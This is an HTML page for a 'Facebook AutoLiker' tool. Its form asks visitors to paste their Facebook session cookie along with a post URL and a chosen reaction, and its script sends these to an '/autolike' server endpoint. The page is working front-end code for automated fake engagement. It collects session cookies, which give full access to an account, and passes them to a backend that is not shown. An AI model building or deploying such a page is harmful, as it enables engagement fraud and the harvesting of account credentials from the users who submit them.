<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FB AutoLiker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        input, select, button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #28a745;
            color: #fff;
            cursor: pointer;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Facebook AutoLiker</h2>
        <form id="autolikerForm">
            <label for="cookie">Facebook Cookie:</label>
            <input type="text" id="cookie" name="cookie" required>

            <label for="url">Post URL:</label>
            <input type="url" id="url" name="url" required>

            <label for="reaction">Select Reaction:</label>
            <select id="reaction" name="reaction">
                <option value="like">Like</option>
                <option value="love">Love</option>
                <option value="care">Care</option>
                <option value="haha">Haha</option>
                <option value="wow">Wow</option>
                <option value="sad">Sad</option>
                <option value="angry">Angry</option>
            </select>

            <button type="submit">Submit</button>
        </form>
    </div>

    <script>
        document.getElementById('autolikerForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const cookie = document.getElementById('cookie').value;
            const url = document.getElementById('url').value;
            const reaction = document.getElementById('reaction').value;

            const response = await fetch('/autolike', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookie, url, reaction })
            });

            const result = await response.json();
            alert(result.message);
        });
    </script>
</body>
</html>
